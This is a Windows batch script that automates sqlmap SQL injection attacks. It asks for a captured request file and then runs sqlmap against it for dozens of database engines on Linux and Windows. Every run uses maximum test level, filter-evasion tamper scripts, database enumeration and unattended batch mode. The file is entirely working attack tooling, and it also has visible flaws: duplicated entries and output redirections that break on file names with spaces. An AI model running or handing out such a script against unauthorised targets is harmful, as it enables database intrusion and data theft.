@echo off					
set /p fileFx="Enter filePath and file name: "	
sqlmap -r	 %fileFx% 	   --dbms="Aurora"	   --os=linux    --level=5    --risk=1     --tamper="space2comment,between,randomcase"	   --dbs    --flush-session     --batch   >  Aurora-linux .txt	
sqlmap -r	 %fileFx% 	   --dbms="EnterpriseDB"	   --os=linux    --level=5    --risk=1     --tamper="space2comment,between,randomcase"	   --dbs    --flush-session     --batch  >  EnterpriseDB-linux .txt	
sqlmap -r	 %fileFx% 	   --dbms="FrontBase"	   --os=linux    --level=5    --risk=1     --tamper="space2comment,between,randomcase"	   --dbs    --flush-session     --batch  >  FrontBase-linux .txt	
sqlmap -r	 %fileFx% 	   --dbms="Virtuoso"	   --os=linux    --level=5    --risk=1     --tamper="space2comment,between,randomcase"	   --dbs    --flush-session     --batch  >  Virtuoso-linux .txt	
sqlmap -r	 %fileFx% 	   --dbms="Yellowbrick"	   --os=linux    --level=5    --risk=1     --tamper="space2comment,between,randomcase"	   --dbs    --flush-session     --batch  >  Yellowbrick-linux .txt
sqlmap -r	 %fileFx% 	   --dbms="Raima Database Manager"	   --os=linux    --level=5    --risk=1     --tamper="space2comment,between,randomcase"	   --dbs    --flush-session     --batch  >  raima-linux .txt				
sqlmap -r	 %fileFx% 	   --dbms=mysql	   --os=linux    --level=5    --risk=1     --tamper="space2comment,between,randomcase"	   --dbs    --flush-session     --batch  >  mysql-linux .txt
sqlmap -r	 %fileFx% 	   --dbms=oracle	   --os=linux    --level=5    --risk=1     --tamper="space2comment,between,randomcase"	   --dbs    --flush-session     --batch  >  oracle-linux .txt
sqlmap -r	 %fileFx% 	   --dbms=postgresql	   --os=linux    --level=5    --risk=1     --tamper="space2comment,between,randomcase"	   --dbs    --flush-session     --batch  >  postgresql-linux .txt
sqlmap -r	 %fileFx% 	   --dbms="Microsoft SQL Server"	   --os=linux    --level=5    --risk=1     --tamper="space2comment,between,randomcase"	   --dbs    --flush-session     --batch  >  mssql-linux .txt
sqlmap -r	 %fileFx% 	   --dbms="Microsoft Access"	   --os=linux    --level=5    --risk=1     --tamper="space2comment,between,randomcase"	   --dbs    --flush-session     --batch  >  msaccess-linux .txt
sqlmap -r	 %fileFx% 	   --dbms="IBM DB2"	   --os=linux    --level=5    --risk=1     --tamper="space2comment,between,randomcase"	   --dbs    --flush-session     --batch  >  IBM DB2-linux .txt
sqlmap -r	 %fileFx% 	   --dbms=sqlite	   --os=linux    --level=5    --risk=1     --tamper="space2comment,between,randomcase"	   --dbs    --flush-session     --batch  >  sqlite-linux .txt
sqlmap -r	 %fileFx% 	   --dbms=firebird	   --os=linux    --level=5    --risk=1     --tamper="space2comment,between,randomcase"	   --dbs    --flush-session     --batch  >  firebird-linux .txt
sqlmap -r	 %fileFx% 	   --dbms=sybase	   --os=linux    --level=5    --risk=1     --tamper="space2comment,between,randomcase"	   --dbs    --flush-session     --batch  >  sybase-linux .txt
sqlmap -r	 %fileFx% 	   --dbms="SAP MaxDB"	   --os=linux    --level=5    --risk=1     --tamper="space2comment,between,randomcase"	   --dbs    --flush-session     --batch  >  SAP MaxDB-linux .txt
sqlmap -r	 %fileFx% 	   --dbms=informix	   --os=linux    --level=5    --risk=1     --tamper="space2comment,between,randomcase"	   --dbs    --flush-session     --batch  >  informix-linux .txt
sqlmap -r	 %fileFx% 	   --dbms=mariadb	   --os=linux    --level=5    --risk=1     --tamper="space2comment,between,randomcase"	   --dbs    --flush-session     --batch  >  mariadb-linux .txt
sqlmap -r	 %fileFx% 	   --dbms=percona	   --os=linux    --level=5    --risk=1     --tamper="space2comment,between,randomcase"	   --dbs    --flush-session     --batch  >  percona-linux .txt
sqlmap -r	 %fileFx% 	   --dbms=memsql	   --os=linux    --level=5    --risk=1     --tamper="space2comment,between,randomcase"	   --dbs    --flush-session     --batch  >  memsql-linux .txt
sqlmap -r	 %fileFx% 	   --dbms=tidb	   --os=linux    --level=5    --risk=1     --tamper="space2comment,between,randomcase"	   --dbs    --flush-session     --batch  >  tidb-linux .txt
sqlmap -r	 %fileFx% 	   --dbms=cockroachdb	   --os=linux    --level=5    --risk=1     --tamper="space2comment,between,randomcase"	   --dbs    --flush-session     --batch  >  cockroachdb-linux .txt
sqlmap -r	 %fileFx% 	   --dbms=hsqldb	   --os=linux    --level=5    --risk=1     --tamper="space2comment,between,randomcase"	   --dbs    --flush-session     --batch  >  hsqldb-linux .txt
sqlmap -r	 %fileFx% 	   --dbms=H2	   --os=linux    --level=5    --risk=1     --tamper="space2comment,between,randomcase"	   --dbs    --flush-session     --batch  >  H2-linux .txt
sqlmap -r	 %fileFx% 	   --dbms=monetdb	   --os=linux    --level=5    --risk=1     --tamper="space2comment,between,randomcase"	   --dbs    --flush-session     --batch  >  monetdb-linux .txt
sqlmap -r	 %fileFx% 	   --dbms="apache derby"	   --os=linux    --level=5    --risk=1     --tamper="space2comment,between,randomcase"	   --dbs    --flush-session     --batch  >  apachederby-linux .txt
sqlmap -r	 %fileFx% 	   --dbms="amazon redshift"	   --os=linux    --level=5    --risk=1     --tamper="space2comment,between,randomcase"	   --dbs    --flush-session     --batch  >  amazon redshift-linux .txt
sqlmap -r	 %fileFx% 	   --dbms=vertica	   --os=linux    --level=5    --risk=1     --tamper="space2comment,between,randomcase"	   --dbs    --flush-session     --batch  >  vertica-linux .txt
sqlmap -r	 %fileFx% 	   --dbms=mckoi	   --os=linux    --level=5    --risk=1     --tamper="space2comment,between,randomcase"	   --dbs    --flush-session     --batch  >  mckoi-linux .txt
sqlmap -r	 %fileFx% 	   --dbms=presto	   --os=linux    --level=5    --risk=1     --tamper="space2comment,between,randomcase"	   --dbs    --flush-session     --batch  >  presto-linux .txt
sqlmap -r	 %fileFx% 	   --dbms=altibase	   --os=linux    --level=5    --risk=1     --tamper="space2comment,between,randomcase"	   --dbs    --flush-session     --batch  >  altibase-linux .txt
sqlmap -r	 %fileFx% 	   --dbms=mimersql	   --os=linux    --level=5    --risk=1     --tamper="space2comment,between,randomcase"	   --dbs    --flush-session     --batch  >  mimersql-linux .txt
sqlmap -r	 %fileFx% 	   --dbms=cratedb	   --os=linux    --level=5    --risk=1     --tamper="space2comment,between,randomcase"	   --dbs    --flush-session     --batch  >  cratedb-linux .txt
sqlmap -r	 %fileFx% 	   --dbms=greenplum	   --os=linux    --level=5    --risk=1     --tamper="space2comment,between,randomcase"	   --dbs    --flush-session     --batch  >  greenplum-linux .txt
sqlmap -r	 %fileFx% 	   --dbms=drizzle	   --os=linux    --level=5    --risk=1     --tamper="space2comment,between,randomcase"	   --dbs    --flush-session     --batch  >  drizzle-linux .txt
sqlmap -r	 %fileFx% 	   --dbms="apache ignite"	   --os=linux    --level=5    --risk=1     --tamper="space2comment,between,randomcase"	   --dbs    --flush-session     --batch  >  apacheignite-linux .txt
sqlmap -r	 %fileFx% 	   --dbms=cubrid	   --os=linux    --level=5    --risk=1     --tamper="space2comment,between,randomcase"	   --dbs    --flush-session     --batch  >  cubrid-linux .txt
sqlmap -r	 %fileFx% 	   --dbms="intersystems cache"	   --os=linux    --level=5    --risk=1     --tamper="space2comment,between,randomcase"	   --dbs    --flush-session     --batch  >  intersystems cache-linux .txt
sqlmap -r	 %fileFx% 	   --dbms=iris	   --os=linux    --level=5    --risk=1     --tamper="space2comment,between,randomcase"	   --dbs    --flush-session     --batch  >  iris-linux .txt
sqlmap -r	 %fileFx% 	   --dbms=extremedb	   --os=linux    --level=5    --risk=1     --tamper="space2comment,between,randomcase"	   --dbs    --flush-session     --batch  >  extremedb-linux .txt
sqlmap -r	 %fileFx% 	   --dbms=frontbase	   --os=linux    --level=5    --risk=1     --tamper="space2comment,between,randomcase"	   --dbs    --flush-session     --batch  >  frontbase-linux .txt
sqlmap -r	 %fileFx% 	   --dbms=mysql	   --os=windows    --level=5    --risk=1     --tamper="space2comment,between,randomcase"	   --dbs    --flush-session     --batch  >  mysql-windows .txt
sqlmap -r	 %fileFx% 	   --dbms=oracle	   --os=windows    --level=5    --risk=1     --tamper="space2comment,between,randomcase"	   --dbs    --flush-session     --batch  >  oracle-windows .txt
sqlmap -r	 %fileFx% 	   --dbms=postgresql	   --os=windows    --level=5    --risk=1     --tamper="space2comment,between,randomcase"	   --dbs    --flush-session     --batch  >  postgresql-windows .txt
sqlmap -r	 %fileFx% 	   --dbms="Microsoft SQL Server"	   --os=windows    --level=5    --risk=1     --tamper="space2comment,between,randomcase"	   --dbs    --flush-session     --batch  >  mssql-windows .txt
sqlmap -r	 %fileFx% 	   --dbms="Microsoft Access"	   --os=windows    --level=5    --risk=1     --tamper="space2comment,between,randomcase"	   --dbs    --flush-session     --batch  >  msaccess-windows .txt
sqlmap -r	 %fileFx% 	   --dbms="IBM DB2"	   --os=windows    --level=5    --risk=1     --tamper="space2comment,between,randomcase"	   --dbs    --flush-session     --batch  >  IBM DB2-windows .txt
sqlmap -r	 %fileFx% 	   --dbms=sqlite	   --os=windows    --level=5    --risk=1     --tamper="space2comment,between,randomcase"	   --dbs    --flush-session     --batch  >  sqlite-windows .txt
sqlmap -r	 %fileFx% 	   --dbms=firebird	   --os=windows    --level=5    --risk=1     --tamper="space2comment,between,randomcase"	   --dbs    --flush-session     --batch  >  firebird-windows .txt
sqlmap -r	 %fileFx% 	   --dbms=sybase	   --os=windows    --level=5    --risk=1     --tamper="space2comment,between,randomcase"	   --dbs    --flush-session     --batch  >  sybase-windows .txt
sqlmap -r	 %fileFx% 	   --dbms="SAP MaxDB"	   --os=windows    --level=5    --risk=1     --tamper="space2comment,between,randomcase"	   --dbs    --flush-session     --batch  >  SAP MaxDB-windows .txt
sqlmap -r	 %fileFx% 	   --dbms=informix	   --os=windows    --level=5    --risk=1     --tamper="space2comment,between,randomcase"	   --dbs    --flush-session     --batch  >  informix-windows .txt
sqlmap -r	 %fileFx% 	   --dbms=mariadb	   --os=windows    --level=5    --risk=1     --tamper="space2comment,between,randomcase"	   --dbs    --flush-session     --batch  >  mariadb-windows .txt
sqlmap -r	 %fileFx% 	   --dbms=percona	   --os=windows    --level=5    --risk=1     --tamper="space2comment,between,randomcase"	   --dbs    --flush-session     --batch  >  percona-windows .txt
sqlmap -r	 %fileFx% 	   --dbms=memsql	   --os=windows    --level=5    --risk=1     --tamper="space2comment,between,randomcase"	   --dbs    --flush-session     --batch  >  memsql-windows .txt
sqlmap -r	 %fileFx% 	   --dbms=tidb	   --os=windows    --level=5    --risk=1     --tamper="space2comment,between,randomcase"	   --dbs    --flush-session     --batch  >  tidb-windows .txt
sqlmap -r	 %fileFx% 	   --dbms=cockroachdb	   --os=windows    --level=5    --risk=1     --tamper="space2comment,between,randomcase"	   --dbs    --flush-session     --batch  >  cockroachdb-windows .txt
sqlmap -r	 %fileFx% 	   --dbms=hsqldb	   --os=windows    --level=5    --risk=1     --tamper="space2comment,between,randomcase"	   --dbs    --flush-session     --batch  >  hsqldb-windows .txt
sqlmap -r	 %fileFx% 	   --dbms=H2	   --os=windows    --level=5    --risk=1     --tamper="space2comment,between,randomcase"	   --dbs    --flush-session     --batch  >  H2-windows .txt
sqlmap -r	 %fileFx% 	   --dbms=monetdb	   --os=windows    --level=5    --risk=1     --tamper="space2comment,between,randomcase"	   --dbs    --flush-session     --batch  >  monetdb-windows .txt
sqlmap -r	 %fileFx% 	   --dbms="apache derby"	   --os=windows    --level=5    --risk=1     --tamper="space2comment,between,randomcase"	   --dbs    --flush-session     --batch  >  apachederby-windows .txt
sqlmap -r	 %fileFx% 	   --dbms="amazon redshift"	   --os=windows    --level=5    --risk=1     --tamper="space2comment,between,randomcase"	   --dbs    --flush-session     --batch  >  amazon redshift-windows .txt
sqlmap -r	 %fileFx% 	   --dbms=vertica	   --os=windows    --level=5    --risk=1     --tamper="space2comment,between,randomcase"	   --dbs    --flush-session     --batch  >  vertica-windows .txt
sqlmap -r	 %fileFx% 	   --dbms=mckoi	   --os=windows    --level=5    --risk=1     --tamper="space2comment,between,randomcase"	   --dbs    --flush-session     --batch  >  mckoi-windows .txt
sqlmap -r	 %fileFx% 	   --dbms=presto	   --os=windows    --level=5    --risk=1     --tamper="space2comment,between,randomcase"	   --dbs    --flush-session     --batch  >  presto-windows .txt
sqlmap -r	 %fileFx% 	   --dbms=altibase	   --os=windows    --level=5    --risk=1     --tamper="space2comment,between,randomcase"	   --dbs    --flush-session     --batch  >  altibase-windows .txt
sqlmap -r	 %fileFx% 	   --dbms=mimersql	   --os=windows    --level=5    --risk=1     --tamper="space2comment,between,randomcase"	   --dbs    --flush-session     --batch  >  mimersql-windows .txt
sqlmap -r	 %fileFx% 	   --dbms=cratedb	   --os=windows    --level=5    --risk=1     --tamper="space2comment,between,randomcase"	   --dbs    --flush-session     --batch  >  cratedb-windows .txt
sqlmap -r	 %fileFx% 	   --dbms=greenplum	   --os=windows    --level=5    --risk=1     --tamper="space2comment,between,randomcase"	   --dbs    --flush-session     --batch  >  greenplum-windows .txt
sqlmap -r	 %fileFx% 	   --dbms=drizzle	   --os=windows    --level=5    --risk=1     --tamper="space2comment,between,randomcase"	   --dbs    --flush-session     --batch  >  drizzle-windows .txt
sqlmap -r	 %fileFx% 	   --dbms=apacheignite	   --os=windows    --level=5    --risk=1     --tamper="space2comment,between,randomcase"	   --dbs    --flush-session     --batch  >  apacheignite-windows .txt
sqlmap -r	 %fileFx% 	   --dbms=cubrid	   --os=windows    --level=5    --risk=1     --tamper="space2comment,between,randomcase"	   --dbs    --flush-session     --batch  >  cubrid-windows .txt
sqlmap -r	 %fileFx% 	   --dbms=intersystemscache	   --os=windows    --level=5    --risk=1     --tamper="space2comment,between,randomcase"	   --dbs    --flush-session     --batch  >  intersystemscache-windows .txt
sqlmap -r	 %fileFx% 	   --dbms=iris	   --os=windows    --level=5    --risk=1     --tamper="space2comment,between,randomcase"	   --dbs    --flush-session     --batch  >  iris-windows .txt
sqlmap -r	 %fileFx% 	   --dbms=extremedb	   --os=windows    --level=5    --risk=1     --tamper="space2comment,between,randomcase"	   --dbs    --flush-session     --batch  >  extremedb-windows .txt
sqlmap -r	 %fileFx% 	   --dbms=frontbase	   --os=windows    --level=5    --risk=1     --tamper="space2comment,between,randomcase"	   --dbs    --flush-session     --batch  >  frontbase-windows .txt
sqlmap -r	 %fileFx% 	   --dbms="intersystems cache"	   --os=windows    --level=5    --risk=1     --tamper="space2comment,between,randomcase"	   --dbs    --flush-session     --batch  >  intersystems cache-windows .txt
sqlmap -r	 %fileFx% 	   --dbms="Raima Database Manager"	   --os=windows    --level=5    --risk=1     --tamper="space2comment,between,randomcase"	   --dbs    --flush-session     --batch  >  raima-windows .txt
sqlmap -r	 %fileFx% 	   --dbms="Aurora"	   --os=windows    --level=5    --risk=1     --tamper="space2comment,between,randomcase"	   --dbs    --flush-session     --batch   >  Aurora-windows .txt	
sqlmap -r	 %fileFx% 	   --dbms="EnterpriseDB"	   --os=windows    --level=5    --risk=1     --tamper="space2comment,between,randomcase"	   --dbs    --flush-session     --batch   >  EnterpriseDB-windows .txt	
sqlmap -r	 %fileFx% 	   --dbms="FrontBase"	   --os=windows    --level=5    --risk=1     --tamper="space2comment,between,randomcase"	   --dbs    --flush-session     --batch   >  FrontBase-windows .txt	
sqlmap -r	 %fileFx% 	   --dbms="Virtuoso"	   --os=windows    --level=5    --risk=1     --tamper="space2comment,between,randomcase"	   --dbs    --flush-session     --batch   >  Virtuoso-windows .txt	
sqlmap -r	 %fileFx% 	   --dbms="Yellowbrick"	   --os=windows    --level=5    --risk=1     --tamper="space2comment,between,randomcase"	   --dbs    --flush-session     --batch   >  Yellowbrick-windows .txt